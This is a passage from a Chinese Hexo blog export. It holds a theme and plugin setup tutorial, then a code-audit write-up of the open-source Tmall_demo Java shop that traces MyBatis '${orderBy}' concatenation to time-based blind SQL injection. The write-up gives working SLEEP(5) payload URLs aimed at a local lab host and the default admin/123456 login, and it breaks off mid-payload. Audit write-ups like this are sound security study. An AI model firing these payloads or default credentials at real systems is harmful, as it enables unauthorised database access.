class=\"built_in\">date</span>: 2017-12-24 23:29:53</span><br><span class=\"line\">tags:</span><br><span class=\"line\">- Foo</span><br><span class=\"line\">- Bar</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"BSXKfFqVvy9gbD0QiMuzv7Pr0zlOFyqPeRa51pvli0Y.png\" alt=\"image\"></p>\n<h2 id=\"博客访问量统计\"><a href=\"#博客访问量统计\" class=\"headerlink\" title=\"博客访问量统计\"></a>博客访问量统计</h2><p>进入.&#x2F;themes&#x2F;hexo-theme-cactus&#x2F;_config.yml添加下面一段代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 是否开启访问量统计功能(不蒜子)</span></span><br><span class=\"line\">busuanzi:</span><br><span class=\"line\"> <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>进入.&#x2F;themes&#x2F;hexo-theme-cactus&#x2F;layout&#x2F;_partial&#x2F;footer.ejs将添加下面内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;footer <span class=\"built_in\">id</span>=<span class=\"string\">&quot;footer&quot;</span>&gt;</span><br><span class=\"line\">    &lt;div class=<span class=\"string\">&quot;footer-left&quot;</span>&gt;</span><br><span class=\"line\">        &lt;%= __(<span class=\"string\">&#x27;footer.copyright&#x27;</span>) %&gt; &amp;copy;</span><br><span class=\"line\">        &lt;% var endYear = (theme.copyright &amp;&amp; theme.copyright.end_year) ? theme.copyright.end_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">        &lt;% var startYear = (theme.copyright &amp;&amp; theme.copyright.start_year) ? theme.copyright.start_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">        &lt;%= startYear &gt;= endYear ? endYear : startYear + <span class=\"string\">&quot;-&quot;</span> + endYear %&gt;</span><br><span class=\"line\">        &lt;%= config.author || config.title %&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">    &lt;div class=<span class=\"string\">&quot;footer-right&quot;</span>&gt;</span><br><span class=\"line\">        &lt;nav&gt;</span><br><span class=\"line\">            &lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">for</span> (var i <span class=\"keyword\">in</span> theme.nav) &#123; %&gt;&lt;!--</span><br><span class=\"line\">       --&gt;&lt;li&gt;&lt;a href=<span class=\"string\">&quot;&lt;%- url_for(theme.nav[i]) %&gt;&quot;</span>&gt;&lt;%= __(<span class=\"string\">&#x27;nav.&#x27;</span>+i).replace(<span class=\"string\">&quot;nav.&quot;</span>, <span class=\"string\">&quot;&quot;</span>) %&gt;&lt;/a&gt;&lt;/li&gt;&lt;!--</span><br><span class=\"line\">     --&gt;&lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\">            &lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">if</span> (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">                    &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;span class=<span class=\"string\">&quot;post-meta-divider&quot;</span>&gt;|&lt;/span&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_uv&quot;</span> style=<span class=\"string\">&#x27;display:none&#x27;</span>&gt;</span><br><span class=\"line\">                      本站访客数&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_uv&quot;</span>&gt;&lt;/span&gt;人</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;script async src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">                &lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;/nav&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/footer&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"poHJNJtonbsgvvQIBG8E41KtD96hIIGt4BJFaA_zc_4.png\" alt=\"image\"></p>\n<p><img src=\"PsVIGJRySYSQSslwM2YnUpiuRKCqnZ1W7Ly_0xeAZLA.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">if</span> (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">                    &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;script async src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">                &lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"文章添加图片\"><a href=\"#文章添加图片\" class=\"headerlink\" title=\"文章添加图片\"></a>文章添加图片</h2><h3 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>\n<h3 id=\"修改-config-yml\"><a href=\"#修改-config-yml\" class=\"headerlink\" title=\"修改_config.yml\"></a>修改_config.yml</h3><p>打开hexo的配置文件_config.yml；找到 post_asset_folder，把这个选项从false改成true</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#加载图片用到</span></span><br><span class=\"line\">post_asset_folder: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"修改index-js\"><a href=\"#修改index-js\" class=\"headerlink\" title=\"修改index.js\"></a>修改index.js</h3><p>文件：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">/node_modules/hexo-asset-image/index.js</span><br></pre></td></tr></table></figure>\n<p>修改内容1：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">58</span>行</span><br><span class=\"line\">$(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>, config.<span class=\"property\">root</span> + link + src);</span><br><span class=\"line\">修改为：</span><br><span class=\"line\">$(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>,src);</span><br></pre></td></tr></table></figure>\n<p>修改内容2：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">45</span>行</span><br><span class=\"line\">|| <span class=\"regexp\">/^\\s*\\/uploads|images\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\">修改为：</span><br><span class=\"line\">|| <span class=\"regexp\">/^\\s*\\/uploads|images1\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最终代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> cheerio = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;cheerio&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getPosition</span>(<span class=\"params\">str, m, i</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str.<span class=\"title function_\">split</span>(m, i).<span class=\"title function_\">join</span>(m).<span class=\"property\">length</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">hexo.<span class=\"property\">extend</span>.<span class=\"property\">filter</span>.<span class=\"title function_\">register</span>(<span class=\"string\">&#x27;after_post_render&#x27;</span>, <span class=\"keyword\">function</span>(<span class=\"params\">data</span>)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> config = hexo.<span class=\"property\">config</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(config.<span class=\"property\">post_asset_folder</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> link = data.<span class=\"property\">permalink</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> beginPos = <span class=\"title function_\">getPosition</span>(link, <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"number\">3</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> appendLink = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"comment\">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class=\"line\">    <span class=\"comment\">// if not with index.html endpos = link.lastIndexOf(&#x27;.&#x27;) + 1 support hexo-abbrlink</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"regexp\">/.*\\/index\\.html$/</span>.<span class=\"title function_\">test</span>(link)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html</span></span><br><span class=\"line\">      <span class=\"comment\">// image in xxtitle/ will go to xxtitle/index/</span></span><br><span class=\"line\">      appendLink = <span class=\"string\">&#x27;index/&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> endPos = link.<span class=\"title function_\">lastIndexOf</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> endPos = link.<span class=\"title function_\">lastIndexOf</span>(<span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    link = link.<span class=\"title function_\">substring</span>(beginPos, endPos) + <span class=\"string\">&#x27;/&#x27;</span> + appendLink;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> toprocess = [<span class=\"string\">&#x27;excerpt&#x27;</span>, <span class=\"string\">&#x27;more&#x27;</span>, <span class=\"string\">&#x27;content&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; toprocess.<span class=\"property\">length</span>; i++)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> key = toprocess[i];</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">var</span> $ = cheerio.<span class=\"title function_\">load</span>(data[key], &#123;</span><br><span class=\"line\">        <span class=\"attr\">ignoreWhitespace</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">xmlMode</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">lowerCaseTags</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">decodeEntities</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $(<span class=\"string\">&#x27;img&#x27;</span>).<span class=\"title function_\">each</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>))&#123;</span><br><span class=\"line\">          <span class=\"comment\">// For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;.</span></span><br><span class=\"line\">          <span class=\"keyword\">var</span> src = $(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>).<span class=\"title function_\">replace</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span>(!(<span class=\"regexp\">/http[s]*.*|\\/\\/.*/</span>.<span class=\"title function_\">test</span>(src)</span><br><span class=\"line\">            || <span class=\"regexp\">/^\\s+\\//</span>.<span class=\"title function_\">test</span>(src)</span><br><span class=\"line\">            || <span class=\"regexp\">/^\\s*\\/uploads|images1\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class=\"line\">            <span class=\"comment\">// In addition, to support multi-level local directory.</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> linkArray = link.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">filter</span>(<span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)&#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            <span class=\"keyword\">var</span> srcArray = src.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">filter</span>(<span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)&#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; elem != <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(srcArray.<span class=\"property\">length</span> &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">            srcArray.<span class=\"title function_\">shift</span>();</span><br><span class=\"line\">            src = srcArray.<span class=\"title function_\">join</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//$(this).attr(&#x27;src&#x27;, config.root + link + src);</span></span><br><span class=\"line\">            $(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>, src);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;src：&quot;</span> + src);<span class=\"comment\">//src：Fp7aKq--0PJJ6yD8kdJ6bU6csSL8UPnWsCQKPjaGIv0.png</span></span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;update link as:--&gt;&quot;</span>+config.<span class=\"property\">root</span> + link + src);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;no src attr, skipped...&quot;</span>);</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>($(<span class=\"variable language_\">this</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      data[key] = $.<span class=\"title function_\">html</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Hexo"],"tags":["标签","Hexo"]},{"title":"MINI天猫商城代码审计","url":"/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"<h1 id=\"MINI天猫商城代码审计\"><a href=\"#MINI天猫商城代码审计\" class=\"headerlink\" title=\"MINI天猫商城代码审计\"></a>MINI天猫商城代码审计</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近看到很多师傅们，都在做这套tmall系统的代码审计，一时起兴趣，就自己也下载下来进行审一审，全程按照自己的思路去审计分析。在此进行简单的记录。</p>\n<h2 id=\"环境搭建与配置\"><a href=\"#环境搭建与配置\" class=\"headerlink\" title=\"环境搭建与配置\"></a>环境搭建与配置</h2><p>项目地址：<a href=\"https://gitee.com/project_team/Tmall_demo\">https://gitee.com/project_team/Tmall_demo</a></p>\n<p>配置文件：src&#x2F;main&#x2F;resources&#x2F;application.properties</p>\n<p>修改为自己的数据库地址，也可以修改启动的端口</p>\n<p><img src=\"A9LKEZadvuLcO8WshiS5_zZu2oQ5uFuwZsIsiBWKutQ.png\" alt=\"image\"></p>\n<p>启动文件：src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;TmallSpringBootApplication.java</p>\n<p>待maven加载完依赖之后，在该文件中进行启动项目。</p>\n<p><img src=\"S4qCXllB0lfY-EYB3VvMopRriHMWrvpgNwjnyxFt2mc.png\" alt=\"image\"></p>\n<p>浏览器访问</p>\n<p><img src=\"sGMZu6i0o4YbnEjwZ8WkzHfvhfnCdM1tu9erfY531HU.png\" alt=\"image\"></p>\n<p>当我进行一些功能的操作的时候，发现报错了。</p>\n<p><img src=\"bRwiZdkeSDU9jSMzbGy8q2itpZdBxABxpjripwgAKA0.png\"></p>\n<p>从下面这篇文章找到了解决方法，大概的意思就是我mysql版本较低，有个sql_mode默认没有开启，需要手动开启一下。</p>\n<p><a href=\"https://www.cnblogs.com/hungryquiter/p/16995127.html\">https://www.cnblogs.com/hungryquiter/p/16995127.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">SET @@global.sql_mode =<span class=\"string\">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>上述配置是临时开启该模式，重mysql之后会消失。</p>\n<h2 id=\"审计硬编码和使用的供应链\"><a href=\"#审计硬编码和使用的供应链\" class=\"headerlink\" title=\"审计硬编码和使用的供应链\"></a>审计硬编码和使用的供应链</h2><h3 id=\"硬编码\"><a href=\"#硬编码\" class=\"headerlink\" title=\"硬编码\"></a>硬编码</h3><p>直接ctrl+shif+f 全局搜索password 、pass、jdbc等关键字。</p>\n<p>搜索password</p>\n<p><img src=\"dW055RlSMosFZVq3Bsle4y6ZgLBaFc76sWTt31hvpTo.png\" alt=\"image\"></p>\n<p>搜索jdbc</p>\n<p><img src=\"G0pAhAER4GW7XH0vPkzaFeSJI_ejyw3q2_n5f_LUFZk.png\" alt=\"image\"></p>\n<p>上述可看到一些硬编码</p>\n<h3 id=\"供应链安全\"><a href=\"#供应链安全\" class=\"headerlink\" title=\"供应链安全\"></a>供应链安全</h3><p>本项目是使用maven管理，所以直接查看pom.xml文件，分析用了那些依赖以及版本。再去判断是否存在漏洞。</p>\n<p><img src=\"JaLhHxRPGH2PkAW5npc8PT2CFajmXD_vOXIlKuX9oA4.png\" alt=\"image\"></p>\n<p>分析到了druid、fastjson、log4j、springframework.boot等一些比较常见的存在漏洞的组件或框架。</p>\n<p>先对其有大致的了解，后续再深入研究。</p>\n<h2 id=\"审计owaspTop10漏洞\"><a href=\"#审计owaspTop10漏洞\" class=\"headerlink\" title=\"审计owaspTop10漏洞\"></a>审计owaspTop10漏洞</h2><h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><h4 id=\"SQL注入一（后台）\"><a href=\"#SQL注入一（后台）\" class=\"headerlink\" title=\"SQL注入一（后台）\"></a>SQL注入一（后台）</h4><p>分析了一下该项目，发现mybatis的xml文件均存放在&#x2F;Users&#x2F;garck&#x2F;D&#x2F;code&#x2F;java&#x2F;CodeAudit&#x2F;Tmall_demo-master&#x2F;src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper中。</p>\n<p>下面直接搜索这个文件夹下面的带有 “$” 符号的xml文件来进行详细分析。</p>\n<p><img src=\"R5LFjOKJYSV8ZYNvgY1wBB_a6LHJZ6c2R6c3TlBlk0k.png\" alt=\"image\"></p>\n<p><img src=\"RCVvashWJlQe0ZBbzd4B2s9jZJJLnStqrCCiUbiIV7E.png\" alt=\"image\"></p>\n<p>SQL语句使用了“$” 符号，就是使用了拼接的方式进行执行。若能够控制传入的数据，且没有过滤的情况下，可构造payload进行SQL注入。</p>\n<p>下面开始分析 ProductMapper.xml的“${orderUtil.orderBy}”</p>\n<p><img src=\"g58fPkSb12qkbpG9ZTuazo7yl6doXP36ghUfyljL-Aw.png\" alt=\"image\"></p>\n<p>这是一个查询的SQL语句，并且绑定的是select方法，且是属于接⼝com.xq.tmall.dao.ProductMapper的select方法</p>\n<p><img src=\"faR5oAEY5Gu4y1nT1lH9i-JchVHFuBXXuaYyVNm_wNg.png\" alt=\"image\"></p>\n<p>查看该接口，确认存在select方法，且传入了OrderUtil参数</p>\n<p><img src=\"v5616V98pJYf5lR7b-YXr6JcdwNlf4ApqPEcvhYJBe8.png\" alt=\"image\"></p>\n<p>搜索哪个地方调用了这个接口的方法，发现接口实现类ProductServiceImpl中有调用</p>\n<p><img src=\"CJxsIYmAAtLCiNN58-KsMWlhFQYo3IqUOnBUB1HmDGg.png\" alt=\"image\"></p>\n<p>详情</p>\n<p><img src=\"rQ7D9Wcxk6KTbyuhV03hB8WEBYn-xiHUaH4VXWKD1ZE.png\" alt=\"image\"></p>\n<p>ProductService接口类声明的getList，同时传入的orderUtil</p>\n<p><img src=\"PL7q_4fg5FkMFSnz0LHEA8P10jchuNaB14b6ztmWZDM.png\" alt=\"image\"></p>\n<p>看一下orderUtil工具类</p>\n<p><img src=\"4p_n__dpbG5-Tm7F0E1TcTASSkO6PZKBlh1J-olguRM.png\" alt=\"image\"></p>\n<p>搜索哪个controller类中调用了ProductServiceImpl的getList方法，分析一下ForeProductListController168行</p>\n<p><img src=\"R2SbHwlsZsvVw9hhQD1DomChJ51ER_vTUORis7RK5VM.png\" alt=\"image\"></p>\n<p>看了一下这个注释，大概是在 获取商品列表的时候需要调用ProductService.getList。</p>\n<p>还原一下接口URL；确认是GET请求，根路径是product</p>\n<p><img src=\"L_yJC--fe4KS-0Z0R-Ch-vWP-WJQbIZk29h32GCqOXc.png\" alt=\"image\"></p>\n<p>产品高级查询功能；product&#x2F;{index}&#x2F;{count}，看到这里之后，凉凉了，orderUtil不可控。</p>\n<p><img src=\"K4bGIFH65ZSsmckU05MWP8pyWLBxZYAROhKtsDui5yY.png\" alt=\"image\"></p>\n<p>继续找其他调用ProductService.getList的controller类；看一下ProductController类的49行，发现传入的orderUtil为null，直接跳过分析下一个。</p>\n<p><img src=\"NVpD-Nmps9gm3dqPPBGNT-EHJzN7khr0mQ2mea3jrso.png\" alt=\"image\"></p>\n<p>ProductController类的405行，</p>\n<p><img src=\"8dSTKLl4xUWOBIxmVFrKBta2_M9J4d1cL_9qVEk74Z4.png\" alt=\"image\"></p>\n<p>结合OrderUtil的构造方法分析，看看有没有传入orderBy和isDesc这两个参数</p>\n<p><img src=\"_Mzz8zN1vCnyvwngr31N2h-BNbSrmavfTDLX6SrM4v8.png\" alt=\"image\"></p>\n<p>发现参数可控，前端传入orderBy参数到该控制层</p>\n<p><img src=\"13tqRPx3xqZQ83kZtkKTg8HwJbZuCoZ0ognokbRLfR0.png\" alt=\"image\"></p>\n<p>构造payload</p>\n<p>admin&#x2F;product&#x2F;{index}&#x2F;{count}，加上一个统一的前缀&#x2F;tmall后继续访问；&#x2F;tmall&#x2F;admin&#x2F;product&#x2F;</p>\n<p><img src=\"0QG6nM0OaDbiCoTGabMMDLDR5yZTemvwc39QKJw_my0.png\" alt=\"image\"></p>\n<p>登录后台。账号：admin.  密码：123456</p>\n<p>因为这里使用了rest风格的URL，理论上说index和count可以随意输入，所以直接构造到的URL为：<a href=\"http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1\">http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1</a></p>\n<p>注入参数：orderBy</p>\n<p><img src=\"yRIojR8Gm6UI9QON7BC6ZOsalU5du_SjjFsjTqekvmQ.png\" alt=\"image\"></p>\n<p>添加单引号</p>\n<p><img src=\"Nc-FAUCqKvTesqsgAKPDDccRwg-r31LOVF1JA97e260.png\" alt=\"image\"></p>\n<p>延迟5秒</p>\n<p><img src=\"0RPN1gIO7NsY1qs-Y_82bUvR7OLW9PeEhLgawGI_GqE.png\" alt=\"image\"></p>\n<p>sqlmap验证</p>\n<p><img src=\"H5GbOwzVOfd8htyOuM0quyHPGutc1U7XEXMla1pMh4Q.png\" alt=\"image\"></p>\n<p>看了一下过滤器，只做了权限校验。没有做SQL注入的过滤，所以只要发现参数可控的注入的即可注入，不需要绕过。</p>\n<p><img src=\"6QPlX1nJtLPMGa_rnxqVz10dQfyz9wlyxK3TcNhujQM.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入二（前台）\"><a href=\"#SQL注入二（前台）\" class=\"headerlink\" title=\"SQL注入二（前台）\"></a>SQL注入二（前台）</h4><p>继续寻找调用了ProductServiceImpl的getList方法的controller</p>\n<p>ProductService.getList</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">----  ForeHomeController    ###调用ProductService.getList时传入为null，不存在注入</span><br><span class=\"line\">---+  ProductController     ###后台注入</span><br><span class=\"line\">---+  ForeProductListController   ###前台注入</span><br><span class=\"line\">----  ForeProductDetailsController   ###调用ProductService.getList时传入为null，不存在注入</span><br></pre></td></tr></table></figure>\n<p>ForeProductListController的168行传入了orderUtil对象。</p>\n<p><img src=\"1idGrN6XrKL7LK1kDGa1e8j9NGwt2bwwfbkfr500KFM.png\" alt=\"image\"></p>\n<p>分析orderUtil对象的来源。</p>\n<p><img src=\"l6vzVsRfFF5iXLSZGVP_TxXkOWn1tE1votXCQEIebIs.png\" alt=\"image\"></p>\n<p><img src=\"qpm6TF2VikRSreOzScimwNyJBBjwhx6dqqMfmwiJOkg.png\" alt=\"image\"></p>\n<p>进行构造payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.75.154:8090/tmall/product/0/20?orderBy=1 AND (SELECT 3188 FROM (SELECT(SLEEP(5)))KJQA)</span><br></pre></td></tr></table></figure>\n<p><img src=\"9Z0qgqtR-ynJluX--BI9mg6X_Xq3e8F023Hw3zVtdS4.png\" alt=\"image\"></p>\n<p>成功延迟</p>\n<p><img src=\"aZEjn49GvzMTUfxi6MaanU3wnUu1iI9P2fG6S-XtAko.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入三（前台）\"><a href=\"#SQL注入三（前台）\" class=\"headerlink\" title=\"SQL注入三（前台）\"></a>SQL注入三（前台）</h4><p>分析到了利用链：ProductMapper.selectMoreList—ProductService.getMoreList—ForeProductListController(163)。</p>\n<p>需要满足条件：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">product_name_split不为空</span><br><span class=\"line\">product_name_split.length长度大于1</span><br></pre></td></tr></table></figure>\n<p><img src=\"b7sJTjIfFVd9cOZv38BpuIYAGEIhcENftkJ7TPbklE8.png\" alt=\"image\"></p>\n<p>溯product_name_split的由来</p>\n<p><img src=\"Pfdv1cTF2FZo2Ke7tId-E9i0c62MyJSvfNtVxpAMOhE.png\" alt=\"image\"></p>\n<p>product_name_split &#x3D; product_name.split(“ “);</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">product_name 不为空</span><br></pre></td></tr></table></figure>\n<p>分析得知：product_name_split 是通过空格去匹配来切割product_name传入的参数的值来分隔的</p>\n<p><strong>.split</strong>：可以根据匹配给定的正则表达式来拆分字符串</p>\n<p>所以传入的参数需要传入两个，并且使用空格分隔。最终得到的payload</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">/tmall/product/0/20?orderBy=%31%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%28%73%6c%65%65%70%28%35%29%29%29%6d%73%63%70%29&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=%71%77%65%2c%61%73%64%20%7a%78%63</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/tmall/product/0/20?orderBy=1 AND (select 1 from (select 